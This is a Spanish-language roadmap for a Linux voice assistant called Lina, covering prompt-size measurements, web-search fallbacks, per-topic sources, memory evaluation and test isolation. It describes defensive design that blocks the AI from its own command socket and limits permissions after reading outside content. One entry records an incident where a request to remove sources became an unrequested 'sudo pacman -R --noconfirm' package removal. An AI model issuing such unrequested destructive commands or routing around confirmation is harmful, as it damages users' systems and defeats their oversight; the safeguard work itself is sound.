| V4 | **Instrucciones más ligeras** *(V4a hecho; V4c probada y descartada el 2026-11-02)*: cada llamada lleva ~16 000 caracteres de instrucciones y 5 000–14 000 de herramientas, y se repiten en cada vuelta. Medido sin red: instrucciones 5 322 caracteres, reglas del núcleo 12 288 (la pieza más grande), datos del sistema ~1 100, herramientas del núcleo 5 292 (+481 de `buscar_web`): un principio fijo mínimo de ~24 500 caracteres (~6 000 tokens); cada grupo suma de 1 300 a 9 800; la fecha y la hora van en el mensaje, no en las instrucciones. **V4a** *(hecho)*: `llamadas_ia.jsonl` aparte (últimas 5000, respeta `privacidad.registrar_tiempos`, lo borra `lina olvidar tiempos`) con, por llamada, el modelo, el resultado, los tokens (entrada, caché, salida, razonamiento), los segundos, el tamaño y una huella de 8 caracteres del principio fijo y si se repitió en menos de 5 min; solo el día, sin hora ni texto. `lina tiempos ia [días]` (30 por defecto) lo resume. **Criterio, escrito antes de medir** (sin las llamadas con motivo `medida`, que se muestran aparte): caché, con al menos **50** llamadas: si en las de principio repetido llega desde la caché menos del **30 %** de la entrada → V4b (dejar estable el principio: orden de herramientas, `mas_herramientas`, datos del sistema); si no, no se toca. Tamaño, con al menos **100** llamadas: si el principio fijo pasa de **6 000 tokens** y el cuarto más grande tarda **0,5 s** más (mediana) que el más pequeño, o con clave de pago la entrada es más del **70 %** del gasto → V4c (pasar reglas de situaciones concretas del núcleo a sus grupos, con las pruebas de comportamiento y `probar-ponme` antes y después); si no, no se aligeran. Nunca se quitan reglas de seguridad para ahorrar tokens. Caché explícita, solo si la implícita no funciona con el principio estable y el gasto de pago lo justifica. **V4c, probada y descartada (2026-11-02):** se movieron a sus grupos partes de las reglas 17, 18 y 22, sin tocar las de seguridad ni la 13. Ahorro real: 150 a 170 tokens por llamada (Excel −173, GitHub −164, barra de ruta −150), el 1,5 al 2 %. Pasadas de después con `lina probar-ia`: 15 bien y 1 mal («Ponme el partido en el navegador», ambigua y ajena a las reglas movidas), y 16 bien. La respuesta de GitHub pasó de «voy a añadir el servidor, ¿lo hago?» a «configura el token con lina clave», y el juez de entonces no lo vio porque solo miraba la herramienta. No compensa: si `lina tiempos ia` vuelve a decir que toca V4c, se ignora salvo que cambie el gasto. **Nota para el servicio de pago**: los datos del sistema (programas instalados, distintos para cada usuario) van en las instrucciones, antes de las herramientas, y eso impediría compartir la caché entre usuarios: revisar el orden entonces (lo común primero, lo de cada usuario al final). | M |
| V7 | **Con clave de pago, la gratuita va primero y a veces se pierden 8 s** *(anotado el 2026-11-04, sin tocar)*: en modo rápido `_gemini` prueba antes la clave gratuita y, si hay otra, solo le da `TIMEOUT_PRIMERA_CLAVE` (8 s) antes de pasar a la de pago. En la pasada de pago de `lina probar-busqueda`, 7 de 20 preguntas perdieron esos 8 s. Opciones a medir antes de decidir: saltar la gratuita mientras tenga el cupo diario agotado o haya dado 503 hace poco, o empezar por la de pago en las preguntas que buscan. | S |
| V5 | **Respuesta y voz por frases** (streaming): empezar Piper con la primera frase. Poco para respuestas de una frase; se nota en el modo «a fondo». Después de V1. | M |
| V6 | **Detector de palabra clave para «Oye Lina»** (p. ej. openWakeWord, en CPU, sin VRAM) en vez de pasar Whisper por cada trozo con voz. Opcional y medido como `probar-voz` (falsos positivos por hora, aciertos, CPU). Ojo con las licencias: los modelos preentrenados de openWakeWord no son de uso comercial; habría que entrenar el de «Oye Lina». | M |

### Autonomía
| # | Qué | Tamaño |
|---|---|---|
| A1 | **Medir la memoria antes de cambiarla** *(paso 1 hecho; paso 2 aparcado)*. Hoy un recuerdo es pertinente si comparte **una** raíz de palabra con la petición, y eso además desactiva las órdenes directas y las recetas. Paso 1 (S), *hecho*: `lina memoria medir` compara cuatro reglas (1 palabra, 2 o más, la mitad, mixta) sobre una tanda inventada de 15 recuerdos y 74 peticiones (17 órdenes directas, 45 pares que vienen al caso). Regla de hoy: 34 aciertos, 32 falsos, 11 perdidos, 9 directas desactivadas sin motivo; «2 o más»: 10 aciertos, 3 falsos, 35 perdidos, 0 directas perdidas pero 3 que ignoran una preferencia; mitad y mixta, 21–22 aciertos con 23 falsos y 8 directas perdidas. 11 de 45 pares (24 %) no comparten ninguna raíz. `lina memoria medir --mios` da lo mismo con tus recuerdos, solo números (sin textos, sin IA ni red, sin escribir nada); en el equipo del mantenedor, hoy: 0 recuerdos. **La tanda sirve para comparar las reglas entre sí, no para dimensionar los embeddings**: el 15 % de pares sin raíces es solo una guía, y la decisión del paso 2 se toma con los números de `--mios` a la vista. **Decisión (paso 1): con la memoria del mantenedor vacía no hay base para el paso 2: no se cambia ninguna regla ni se meten embeddings. Se retoma solo si, tras unas semanas usando «recuerda que…», `--mios` muestra un problema real.** Paso 2, **solo si no basta** (M): embeddings pequeños en CPU (modelo multilingüe de ~100 MB con ONNX), **opcionales y apagados por defecto**, medidos con la misma tanda (aciertos, tiempo por petición, memoria) como hace `probar-voz`. Nada de VRAM. | S + M |
| A8 | **«Ponme…» general** *(hecha en código y pruebas; falta validarla en real)*: entiende la IA y elige el código (`contenido.py`), con `lina probar-ponme` para medir. Medido el 25-10-2026, antes del cambio: 2 bien, 2 a medias, 1 mal, 5 por revisar, 19,8 s de media y 24 páginas abiertas en 10 peticiones; en la mejor pasada a mitad del cambio, 6 bien, 0 mal y 3,0 s, pero revisando a mano salieron errores que los jueces no ven (rival equivocado, otra categoría, otro país, «Making of») y se corrigieron. La última versión (comprobar con la propia página) no se pudo medir: se agotó la cuota de Tavily. Pendiente: medirla; pedir a la IA el rival de hoy en un campo propio (a veces solo da un equipo y entonces decide la IA); que lo que abre la IA de reserva también compruebe la fecha; el último vídeo de un canal con yt-dlp; y poner un tope de búsquedas por petición para no agotar la cuota. | M |
| A9 | **Un «sí» vale para toda la tarea** *(hecha)*: tras confirmar, los pasos de la misma clase para conseguirlo (reintentos, otra fuente, `-Syu`, el servicio de ese programa) no vuelven a preguntar durante 15 min, en la petición y sus continuaciones (`Ejecutor.dar_permiso` / `_cubre_el_permiso`). Nunca cubre `SIEMPRE_CONFIRMAN`, código libre con sudo, paquetes sueltos ni lo descargado; tras leer algo de fuera, solo lo que nombra lo mismo; no existe en modo prudente. Además, Lina avisa cuando un comando cambia el kernel y no prepara `modprobe` hasta reiniciar. Surgió de instalar Cloudflare WARP (26-10-2026), que pidió confirmación en cada reintento. | S |
| A10 | **Búsqueda web visible para quien empieza** *(hecha)*. Sin clave de Tavily la IA no tiene `buscar_web`, responde con lo que sabe y nadie lo dice. (1) *Hecho:* `ia.busqueda` en `config.toml` (tavily · google · ninguna) en vez de la constante `BUSQUEDA`, respetada también por «ponme…». (2) *Hecho:* línea «Búsqueda en internet» en `lina doctor`, sin probar la clave (no gasta cupo): tavily sin clave sale ✔ con el comando (no hay marcador neutro); `google` sin clave de pago o con otra IA, aviso. (3) *Hecho:* paso 6 opcional y saltable (Intro = no) en `lina bienvenida`, sin cifras del plan gratuito y coherente con el manual de privacidad (qué es, qué se envía, enlace, `lina clave tavily`); una clave que no empiece por `tvly-` se avisa pero se guarda, sin gastar cupo en validarla. (4) *Hecho:* con `tavily` y sin clave la IA tiene `necesito_datos_actuales` (163 caracteres, ~40 tokens: un 0,7 % sobre instrucciones y núcleo de herramientas, ~23 000 caracteres; menos que `buscar_web`, 481, a la que sustituye; una prueba la topa en 250) y el código avisa una sola vez: lo hablado, corto y sin nombres técnicos; el comando, en una notificación. El «ya avisé» (archivo de estado) se olvida al cambiar `ia.busqueda` o al guardar o borrar la clave de Tavily; con `ninguna`, nunca se avisa. Límite de Tavily, como mucho una vez al mes por motivo y sin decir «gratuito»: 432 (el plan: se renueva cada ciclo o se amplía) y 433 (el tope de gasto que pusiste: se sube en el panel); el 429 es de ritmo y sigue como antes. Va en `HERRAMIENTAS_DE_INFORMAR`, no en las meta (si no, una petición que solo la llama se reintentaría a fondo). Antes de A4. | M |
| A11 | **Fuentes propias por tema** *(hecha: F1, F2, medida, F3a, F3b y F3c)*: «para las recetas de refinería de No Man's Sky, usa esta página»; para lo demás, aunque sea del mismo juego, búsqueda general. **F1** *(hecho)*: `nucleo/fuentes.py` y `lina fuentes` (ver, añadir, quitar), `fuentes.json` 600, hasta 20, tema en frase libre, sin claves ni usuario y solo con dominio de verdad; la IA no puede leerlas ni escribirlas (`lina fuentes` y el archivo, en el bloqueo duro); `lina olvidar fuentes`. Sin efecto en las respuestas. **F2** *(hecho)*: añadir con una frase («para TEMA usa WEB», «usa WEB para TEMA», «cuando pregunte por TEMA usa WEB»), entendida por el código sin IA, solo por atajo o `lina di`, nunca por manos libres; dirección escrita, dominio dictado («punto») o, solo con el atajo, «la página que tengo copiada» (lo copiado que no vale no se repite ni se registra). Lina repite el tema y el dominio deletreado y dice cómo quitarla; «quita la última fuente», por atajo o `lina di`. **Medida antes de activar** *(escrita, sin lanzar)*: `lina fuentes medir [--lanzar]`, sin efecto en las respuestas: 80 frases (A dice receta 10, B por significado 17, W como lo oiría Whisper 5, C mismo juego y otro tema 19, D otro juego 10, E otra cosa 10, F la otra fuente 4, gris 5) y B, C y gris otra vez con el juego abierto: 121 frases × 3 = 363 llamadas con `flash-lite` y la clave gratuita, primer turno y sin ejecutar nada; con dos fuentes de ejemplo (f1 refinería, f2 pociones de The Witcher 3). Etiquetas revisadas por el mantenedor. Los grises se miden y se enseñan aparte, pero no cuentan en el criterio. **Primera medida (335 de 363; faltan 28 por fallos de red al principio, casi todas de A)**: fallo grave 35,4 % y 92,1 % dentro del mismo juego; no la usa 2,3 %. No se activa así. Siguiente, en este orden: **R3** sobre lo ya medido (`--comprobar`: 56 parejas × 3, tema y pregunta sin nada más, con `flash-lite`; si falla o tarda, no se usa la fuente); **R1** sobre C y D (`--variante r1 --grupos C,D`, otra descripción con ejemplos de lo que NO); y completar lo que falte de A, B, W y F antes de decidir. Criterio de R1: C ≤ 2 % y C+D ≤ 2 %, y después comprobar que no pierde aciertos. Criterio de R3, con R3 aplicado: grave ≤ 2 % en total y en el mismo juego, y «no la usa», contando los rechazos erróneos, ≤ 10 %; si rechaza demasiado, probar a darle el juego activo. **Resultado con la tanda completa**: R3 cumple en calidad (2 de 333 graves, 1,8 % en el mismo juego, 3 de 159 sin usar, ningún rechazo erróneo); R1 no (50 % en el mismo juego, y R1 + R3 queda en 2,6 %), y no se adopta. Pero 45 de 234 llamadas de R3 pasaron de 4 s, en ráfagas. **F3a** (`--tiempos`): 100 llamadas con cada clave, sin cortar a 4 s y con una segunda en paralelo a los 2,5 s. Criterio: si la de pago tiene ≤ 2 % sin veredicto y la gratuita más, R3 usa primero la de pago; si ninguna llega al 8 %, medida larga (500 llamadas en 5 sesiones); si tampoco falla la gratuita, no hubo ráfaga y se repite. Después **F3b** (R3 en producción y `lina fuentes probar`) y **F3c** (activar con los manuales). Si R3 no contesta, sigue la búsqueda general sin decir nada y queda solo en el registro; la ayuda dirá que en las preguntas de seguimiento R3 solo ve esa frase. **Resultado de F3a y cambio de criterio**: 0 de 170 llamadas pasaron de 4 s (100 de pago, 70 gratuitas, que se quedaron sin cupo; mediana 0,65 s, p95 0,83 s). Según el criterio tocaba repetir, porque no hubo ráfaga. **Se cambia a propósito**: el fallo de R3 es seguro (cae a la búsqueda general) y la clave de pago cuesta unos 0,00006 $ por comprobación, así que F3b sigue con la clave de pago primero y la opción C (2,5 s + reintento de 2,5 s, por la misma clave). Esto se apoya en coste y seguridad, no en F3a: no se sabe qué causó los 45 timeouts ni está probado que C o la clave de pago los eviten. **Regla escrita**: si en las primeras 100 comprobaciones de uso real más de 8 se quedan sin veredicto, se para y se revisa. Las de `lina fuentes probar` se enseñan aparte y no cuentan. `lina tiempos ia` lo avisa, no se apaga solo. Con menos de 100 comprobaciones, el aviso solo salta al llegar a 9 fallos: que no haya saltado no equivale a «va bien», porque 5 fallos de 20 no avisan y serían un 25 %. Criterio escrito antes de medir: usarla de más o con id equivocado ≤ 2 % (también dentro del mismo juego) y no usarla cuando debía ≤ 10 % → herramienta sola; fallo grave ≤ 2 % pero no la usa más del 10 % → paso previo con `flash-lite` (R2); fallo grave > 2 % → no se activa así, comprobación del tema al usarla (R3) y volver a medir. **F3**, solo con el refuerzo que digan los números: `usar_fuente(id, consulta)`, declarada solo si hay fuentes y la frase no es una orden, con el tema en su descripción. Elegido el id, manda el código: busca solo en esa web (gasta una de las dos búsquedas), obliga a citarla y bloquea otras vías para esa búsqueda. Si la fuente no lo tiene (sin resultados, página ilegible o `NO_ESTA`), Lina NO pregunta: sigue sola con la búsqueda general (la otra búsqueda) y lo dice, citando de dónde sale cada cosa. Con `ia.busqueda = ninguna`, lee la página guardada sin buscar (lo dirá el manual de privacidad), y si no está lo dice y no contesta de memoria como si fuera dato. `lina fuentes probar "frase"` (llamada real, sin ejecutar nada). Al activarlo, actualizar `autoconocimiento.LIMITES`. **Cierre (noviembre de 2026):** activada con la descripción base y R3, sin R1. Los casos 1 a 8 de la prueba en vivo salieron bien, con correcciones por el camino: `añade la fuente…` no se entendía, y un fallo de lectura disparaba un reintento a fondo (de ahí S12 y `_lectura_amplia`). **Sin comprobar en vivo:** el 403 real solo se ha probado con la IA simulada; en vivo se usó una web que no conectaba, que sigue el mismo camino de cierre pero no el mismo error. **Al cerrar, la regla del 8 %** llevaba 14 de 100 comprobaciones de uso real, con 0 fallos: aún no prueba nada, y sigue en pie. Medir `lina tiempos ia` al llegar a 100. Pendiente relacionado: M8 (quitar una fuente por voz). | M |
| A12 | **Buscar sin clave por defecto** *(hecha el 2026-11-04; primeras pasadas no concluyentes, ajustada el mismo día y pendiente de repetir)*. Medido antes: DuckDuckGo 1 de 30 a 4 s y 0 de 30 a 30 s (bloqueado desde antes de empezar); la clave gratuita de Gemini da un 429 sin detalle al pedir la búsqueda de Google y 200 sin ella; la de pago, 24 de 30 con mediana 1,4 s, y 6 de 6 de las que faltaban con «Busca en internet:» delante; junto a nuestras funciones, 400; Wikipedia, 27 de 30. Hecho: `ia.busqueda = auto` de fábrica solo para quien no lo tenga escrito, con la escalera Google dentro de Gemini en consulta aparte → Tavily → DuckDuckGo (apagado de fábrica, como mucho una vez cada 30 s, sin disfrazarse) → Wikipedia y wikis de juegos (`datos/wikis.toml`), caché de 12 min, el 429 sin detalle bloquea esa clave hasta cambiarla (la de pago, también hasta mañana, y se dice tal cual: posible tope de gasto), mensaje honesto si todo falla y nunca «no tengo acceso a internet»; la bienvenida recomienda Tavily gratuito; comandos contra buscadores bloqueados; «búscalo igualmente»; S12 por palabra interrogativa. Aceptación con `lina probar-busqueda` en tres niveles. Primeras pasadas (2026-11-04): gratis 0 de 20, tavily 3 de 20, pago 14 de 20, ninguna concluyente: muchas acabaron en la frase del código cuando Gemini no responde (cupo diario de la gratuita, 503, modelos «en pausa» que los reintentos de 20, 40 y 60 s no llegaban a esperar, porque la pausa es de 180 s), y dos respuestas atribuían el dato a una web que no salió («según la wiki UESP» con gamespot, skyrimalchemy y scribd; «según Google News» con emergent.sh). Ajustes: la frase del código sin Gemini cuenta como «api» y no como fallo; cada pregunta empieza sin pausas; criterio reescrito antes de repetir (tavily y pago: el 90 % de las válidas con respuesta y fuente y al menos 15 válidas; si no, «inconclusivo»); el juez acepta la fuente por su nombre (Steam, IGN, «la wiki de Skyrim») y marca como mal la atribución inventada, y se imprime al lado el juez antiguo; en el producto, la IA recibe las webs reales con la regla de citar solo esas y el código corrige la atribución inventada; las wikis, solo para lo enciclopédico, solo resultados que nombren algo de la consulta y leídas por su extracto (hasta 3000 caracteres, sin resumir por trozos: una pregunta había gastado 8 llamadas de una clave con 20 al día); sin Gemini, Lina dice si es el límite diario de la gratuita (y cuándo se renueva) o si está saturado. **Límite:** DuckDuckGo medido desde una IP doméstica no es representativo del servicio alojado. Desde los servidores de un servicio, con muchas peticiones desde pocas direcciones, lo normal es que bloquee pronto, así que **el servicio alojado no podrá depender de él** y tendrá que llevar un buscador con clave y contrato propio. | M |
| A2 | **Banco de pruebas de la IA** *(hecha; la pasada real y la grabación las lanza el mantenedor con `lina probar-ia --grabar`, y hasta entonces `tests/datos/banco_ia.json` está escrito a mano)* (casos ya apuntados: «ponme el partido del Barça contra el Sevilla» y «ponme el partido en el navegador» → buscar la plataforma oficial y abrirla con `xdg-open`, sin quedarse en informar): frases → herramientas esperadas, con respuestas grabadas para la CI y una pasada real opcional. Sin él, cada cambio de instrucciones o de modelo (los `-latest` cambian sin avisar) es a ciegas. | M |
| A3 | **Modelos fijados** en vez de `-latest`, y cambiar de versión solo tras pasar A2. Después de A2. | S |
| A4 | **`lina di "frase"`** *(hecha)*: hablarle por texto a la Lina en marcha (sin micrófono, para pruebas completas reproducibles) por un socket Unix (`$XDG_RUNTIME_DIR/lina/lina.sock`, 0600, `SO_PEERCRED`), líneas JSON; la respuesta sale en la terminal y, con `--voz`, también hablada. Entra por `_atender` con origen **«texto»**: como el atajo (recordar, alias, recetas, ajustes), pero **no confirma acciones críticas ni sube el tope** (decidido: un proceso de tu usuario puede escribir en el socket; memoria y recetas, mismo alcance que editar tus archivos). Ocupada: código 3, sin interrumpir ni encolar. Sin Lina en marcha: código 1, no arranca nada. La IA tiene bloqueados (bloqueo duro del código, no `politica.txt`) `lina di`, `lina pulsar` y cualquier comando con el socket o su carpeta: una capa, no la barrera. | M |
| A5 | **Más contexto, con las mismas reglas que las capturas**: portapapeles, texto seleccionado y archivo seleccionado en Dolphin («resume esto», «manda este archivo»), solo cuando la frase lo pide. | M |
| A6 | **Tareas largas**: plan con pasos y progreso que sobrevive a un reinicio, y tareas programadas («cada lunes vacía Descargas») que pasan por el ejecutor y el diario como todo. | L |
| A7 | **Avisos por iniciativa propia, opcionales** *(hecha: `nucleo/avisos.py`, `[avisos]` y `lina avisos`; solo notificación, sin voz ni IA)*: disco casi lleno, batería baja, actualizaciones pendientes. Apagados por defecto. | M |

### Mantenimiento
| # | Qué | Tamaño |
|---|---|---|
| M1 | **Las pruebas no deben tocar el `$HOME` real** *(hecha: casa temporal en `tests/.casa-pruebas/` desde `conftest.py`, y `test_aislamiento.py`)*: importar `comandos.py` ya llama a `rutas.editable("comandos.txt")`, que copia el archivo de fábrica a `~/.config/lina` si falta, y el proceso de pytest no cambia `HOME` (las suites sí). `conftest.py` debería poner `HOME` y las XDG en una carpeta temporal antes de importar nada. A comprobar primero. | S |
| M1b | **`tmp_path` fuera de `/tmp` también** *(hecha: `pytest_configure` lo lleva a `<casa>/t`, y `test_aislamiento.py` mide la ruta más larga para un socket)*: las pruebas que hacen `HOME=tmp_path` por su cuenta (`test_claves`, `test_rutas`…) siguen en zona desechable, porque pytest crea `tmp_path` bajo `/tmp`. Se arreglaría poniendo `TMPDIR` (o `--basetemp`) dentro de la base del conftest. **Ojo con los sockets**: `test_reproductor` abre un socket AF_UNIX en `tmp_path/mpv.sock`, y con un checkout como el de la CI (`<checkout de la CI, ~28 caracteres>/tests/.casa-pruebas/pytest-of-<usuario>/pytest-N/<nombre de la prueba, hasta 30>0/mpv.sock`, unos 115 caracteres) pasaría de los ~108 caracteres del límite; hay que acortar la base (p. ej. `--basetemp` con un nombre corto) y añadir una prueba que mida la ruta. | S |
| M2 | **Registro de herramientas** *(hecha: `Asistente._HERRAMIENTAS`, y una prueba exige que toda herramienta declarada tenga quien la ejecute)*: `_ejecutar_herramienta` era una cadena de `if` de ~170 líneas. | M |
| M3 | **Estado de la petición en una clase** *(hecha: `TareaActual` da el valor de partida y quita 74 `getattr`; `avisar` y la vuelta a «esperando» de un reintento ya cogen el cerrojo, y `decir` ya lo cogía)*. | M |
| M4 | **Resultados con estructura** (`rc`, salida, comprobado, preparado) que se convierten en texto solo para la IA, en vez de comparar prefijos como `"código de salida: 0"` o `"COMPROBADO AHORA"`. Poco a poco, herramienta a herramienta. | L |
| M5 | **mypy más estricto** *(en curso: `herramientas.py` hecho, con `check_untyped_defs` en `pyproject.toml`)*: en los módulos grandes, uno a uno. | M |
| M7 | **`t_mov`** *(hecha)*: `FALLOS_CONOCIDOS` separa estos dos casos de `DEPENDEN_DEL_ENTORNO`, y un tercer fallo ya salta. **La falta de precisión apenas importa:** son saltos de esquina a esquina con un ratón muy acelerado, y `hacer_clic` no pulsa si `mover_puntero` dice que no ha llegado dentro de su tolerancia. | S |
| M8 | **Quitar una fuente por voz** *(hecha, ampliada el 2026-11-03)*: «quita la fuente de recetas» con el atajo o `lina di` quita la que encaje, solo si no hay duda; por manos libres, rechazo hablado. Si varias encajan, no quita ninguna. Ampliación: por id, varias y todas (todas, con tu «sí»), y quitar/borrar/eliminar/olvidar más «fuente» no llega nunca a la IA. La frase «Quita las fuentes F3 y F4» había acabado en `sudo pacman -R --noconfirm ttf-f3 ttf-f4`: desinstalar un paquete que no nombraste tal cual ahora pide confirmación. | S |
| M9 | **Buscar en toda la web de una fuente** *(hecha)*: con Tavily se buscaba ya en todo el dominio. Con `tavily` sin clave y `busqueda_reserva` activa, ahora busca dentro con DuckDuckGo. Con `ninguna` o la reserva apagada, al guardar la portada avisa de que solo leerá esa dirección. Seguir enlaces internos, descartado: gasta tiempo y tokens por página y lee más contenido de fuera. | S |
| M11 | **El Python de Lina** *(hecha)*: Fedora 45 trajo Python 3.15 y `onnxruntime` no tiene paquete para él. `install.sh` usa el Python de `uv` si está, o el primero del sistema entre 3.11 y 3.14, y si no para; recrea el venv si es de otro Python. `lina doctor` dice el origen. CI: Fedora con su `python3.14`, `fedora:44` aparte y un trabajo informativo con 3.15. Cuando `onnxruntime` publique ruedas para 3.15, ampliar el rango en `install.sh`, `doctor`, `actualizar` y `scripts/fijar_dependencias.sh`. | S |
| M10 | **git en los contenedores de la CI** *(hecha)*: añadirlo al paso `preparar` de las familias en `ci.yml`. Sin él, los 12 omitidos de `test_actualizar.py` dejan `lina update` sin probar en las distros. | S |
| M6 | *(hecha)* En CLAUDE.md, `ruff` como `uvx ruff check src tests` (en el equipo del mantenedor `ruff` no está en el PATH). | S |

### Orden propuesto
1. **S1** (hecha), **S2**, **S3**: lo aprobado.
2. **S4**, **S5**, **S6** (cada rodeo por separado), **S7**: la seguridad estrecha, de lo más sencillo a lo más delicado.
3. **M1**: antes de seguir añadiendo pruebas.
4. **V1**, **V2**: pequeñas y se notan cada día.
5. **A1 paso 1** (medir la memoria) y **A2** (banco de la IA): medir antes de decidir.
6. **V3**, **V4**, **A4**, **A3**.
7. **M2**, **M3**, **S8**.
8. **S9** (diseño de `bwrap`) cuando lo anterior esté probado; **V5**, **V6**, **A5**–**A7**, **M4**, **M5** según la demanda real.

### Fuera, a propósito
- **Cambiar el perfil por defecto o `frenar_cambios`**: decisión del mantenedor; S4–S6 cubren lo medido sin tocar la autonomía.
- **Que lo desconocido pida confirmación** (invertir la lógica): decisión del mantenedor, por la misma razón.
- **Corrector de Whisper con IA local, `hotwords` y `acercar`**: ya medidos y descartados (ver «Decisiones tomadas» en CLAUDE.md).
- **Una ventana de chat**: Lina es de voz; `lina di` (A4) es para probar y para usarla en silencio, sin historial ni ventana.
- **Nada que suba de 4 GB de VRAM**: por eso los embeddings (A1) y el detector de palabra clave (V6) van en la CPU.
- **Quitar las confirmaciones por atajo**: es una decisión de seguridad, no una carencia.

## Orden y entregas

1. **11** (rápida) y a continuación **12** (la que más cambia la experiencia), por partes: 12.1–12.2 primero con *abrir app* y *volumen*, probar en tu equipo y luego
   ampliar.
2. **13** puede ir en paralelo a 12 si prefieres alternar.
3. **14** y **15** al final, cuando haya demanda real.
4. **16** cuando todo lo anterior esté probado y la voz funcione bien.

Versión sugerida: `0.2.0-beta` al cerrar la fase 12 y la 13.

## Riesgos y cómo se cubren

| Riesgo | Cobertura |
|---|---|
| Un falso positivo del camino rápido ejecuta algo no pedido | Solo riesgo bajo, umbral de confianza, negaciones y preguntas a la IA, `lina directas probar`, registro y diario |
| El camino rápido se salta la seguridad | Mismo ejecutor y mismas reglas; no hay ruta especial |
| La memoria permite inyección de contenido ajeno | Solo el código escribe, solo con una frase tuya |
| Dependencias que no están en todas las distribuciones (`playerctl`, `bluetoothctl`, LACT) | Se detectan; si faltan, la acción no se ofrece y Lina lo dice, y `lina doctor` indica qué instalar |
| Más superficie que probar en otros escritorios | Cada acción declara qué escritorios soporta y pasa por la capa de `sesion.py` |
